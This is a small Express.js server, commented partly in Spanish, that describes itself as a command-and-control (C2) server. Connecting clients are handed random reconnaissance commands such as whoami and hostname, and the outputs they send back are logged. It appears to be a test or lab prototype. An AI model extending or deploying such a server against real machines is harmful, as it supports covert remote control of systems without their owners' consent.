const express = require('express');
const app = express();

app.use(express.json());

// Possible commands
const availableCommands = [
    "whoami",
    "hostname",
    "date",
    "uptime"
];

const results = [];

// Main endpoint C2
app.get('/comando', (req, res) => {

    const clientIP = req.ip;
    const fecha = new Date().toISOString();

    console.log(`[${fecha}] Request obtained from WEB (${clientIP})`);

    // Selección de comando (aleatorio para pruebas)
    const comando = availableCommands[
        Math.floor(Math.random() * availableCommands.length)
    ];

    console.log(`[${fecha}] Enviando comando: ${comando}`);

    // Reply for web (will then be forwarded to client)
    res.json({
        resultado: comando
    });
});

app.post('/result', (req, res) => {

    const { command, output } = req.body;

    const fecha = new Date().toISOString();

    const resultData = {
        fecha,
        command,
        output
    };

    // Save in memory
    results.push(resultData);

    console.log(`\n[${fecha}] RESULT RECEIVED`);
    console.log("CMD:", command);
    console.log("OUT:", output);

    res.send("RESULT SAVED");
});


// Boot C2 server
const PORT = 5000;
app.listen(PORT, () => {
    console.log(`C2 escuchando en puerto ${PORT}`);
});